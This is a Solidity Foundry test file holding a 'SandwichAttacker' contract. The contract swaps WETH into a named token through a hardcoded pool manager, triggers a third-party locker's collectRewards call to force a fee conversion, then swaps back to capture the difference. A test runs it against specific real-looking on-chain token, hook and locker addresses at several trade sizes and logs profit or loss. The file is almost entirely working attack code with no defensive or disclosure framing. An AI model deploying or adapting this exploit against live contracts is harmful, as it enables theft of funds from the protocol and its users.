// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

interface IPoolManager {
    struct SwapParams {
        bool zeroForOne;
        int256 amountSpecified;
        uint160 sqrtPriceLimitX96;
    }
    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey memory key, SwapParams memory params, bytes calldata hookData) external returns (int256);
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
    function sync(address currency) external;
    function mint(address to, uint256 id, uint256 amount) external;
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

interface ILocker { function collectRewards(address token) external; }
interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract SandwichAttacker {
    address constant PM = 0x498581fF718922c3f8e6A244956aF099B2652b2b;
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address public owner;
    bytes private pendingData;

    constructor() { owner = msg.sender; }

    function attack(address token, address locker, uint256 wethAmount, PoolKey memory poolKey) external {
        require(msg.sender == owner, "!owner");
        pendingData = abi.encode(token, locker, wethAmount, poolKey);
        IPoolManager(PM).unlock(pendingData);
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == PM, "!pm");
        (address token, address locker, uint256 wethAmount, PoolKey memory key) =
            abi.decode(data, (address, address, uint256, PoolKey));

        bool wethIsToken0 = key.currency0 == WETH;

        // STEP 1: Swap WETH -> token
        // The return is BalanceDelta which is int256 packed as (int128 amount0, int128 amount1)
        int256 rawDelta1 = IPoolManager(PM).swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: wethIsToken0,
                amountSpecified: -int256(wethAmount),
                sqrtPriceLimitX96: wethIsToken0 ? 4295128740 : 1461446703485210103287273052203988822378723970341
            }),
            ""
        );

        // Decode BalanceDelta: upper 128 bits = amount0, lower 128 bits = amount1
        int128 amount0_1 = int128(int256(rawDelta1 >> 128));
        int128 amount1_1 = int128(int256(rawDelta1));

        // Settle what we owe (negative delta = we owe PM)
        // Take what PM owes us (positive delta = PM owes us)
        _settleAndTake(key.currency0, key.currency1, amount0_1, amount1_1);

        // STEP 2: collectRewards (zero-slippage fee conversion happens here)
        try ILocker(locker).collectRewards(token) {} catch {}

        // STEP 3: Swap all tokens back -> WETH
        uint256 tokenBal = IERC20(token).balanceOf(address(this));
        if (tokenBal == 0) { delete pendingData; return ""; }

        int256 rawDelta2 = IPoolManager(PM).swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: !wethIsToken0,
                amountSpecified: -int256(tokenBal),
                sqrtPriceLimitX96: !wethIsToken0 ? 4295128740 : 1461446703485210103287273052203988822378723970341
            }),
            ""
        );

        int128 amount0_2 = int128(int256(rawDelta2 >> 128));
        int128 amount1_2 = int128(int256(rawDelta2));
        _settleAndTake(key.currency0, key.currency1, amount0_2, amount1_2);

        delete pendingData;
        return "";
    }

    function _settleAndTake(address c0, address c1, int128 d0, int128 d1) internal {
        // Negative delta = we owe PM (settle). Positive delta = PM owes us (take).
        if (d0 < 0) {
            uint256 owed = uint256(uint128(-d0));
            IPoolManager(PM).sync(c0);
            IERC20(c0).transfer(PM, owed);
            IPoolManager(PM).settle();
        } else if (d0 > 0) {
            IPoolManager(PM).take(c0, address(this), uint256(uint128(d0)));
        }

        if (d1 < 0) {
            uint256 owed = uint256(uint128(-d1));
            IPoolManager(PM).sync(c1);
            IERC20(c1).transfer(PM, owed);
            IPoolManager(PM).settle();
        } else if (d1 > 0) {
            IPoolManager(PM).take(c1, address(this), uint256(uint128(d1)));
        }
    }

    function rescue(address token) external {
        require(msg.sender == owner);
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }

    receive() external payable {}
}

contract SandwichTest is Test {
    address constant WETH = 0x4200000000000000000000000000000000000006;
    address constant LOCKER = 0x63D2DfEA64b3433F4071A98665bcD7Ca14d93496;
    SandwichAttacker attacker;

    function setUp() public {
        attacker = new SandwichAttacker();
        deal(WETH, address(attacker), 1 ether);
    }

    function test_sandwichCREAO() public {
        address token = 0x59D916075b3F4DCd4121E4AD2Fb79fF7E8677b07;
        address hook = 0xd60D6B218116cFd801E28F78d011a203D2b068Cc;
        PoolKey memory key = PoolKey({ currency0: WETH, currency1: token, fee: 0x800000, tickSpacing: int24(200), hooks: hook });

        uint256 wethBefore = IERC20(WETH).balanceOf(address(attacker));
        emit log_named_uint("WETH before", wethBefore);

        // Try multiple sizes
        uint256[] memory sizes = new uint256[](3);
        sizes[0] = 0.001 ether;
        sizes[1] = 0.01 ether;
        sizes[2] = 0.1 ether;

        for (uint256 i = 0; i < sizes.length; i++) {
            // Reset state for each test
            deal(WETH, address(attacker), 1 ether);
            uint256 before = IERC20(WETH).balanceOf(address(attacker));

            try attacker.attack(token, LOCKER, sizes[i], key) {
                uint256 after_ = IERC20(WETH).balanceOf(address(attacker));
                if (after_ > before) {
                    emit log_named_uint("SIZE", sizes[i]);
                    emit log_named_uint("PROFIT", after_ - before);
                } else {
                    emit log_named_uint("SIZE", sizes[i]);
                    emit log_named_uint("LOSS", before - after_);
                }
            } catch {
                emit log_named_uint("FAILED at size", sizes[i]);
            }
        }
    }
}
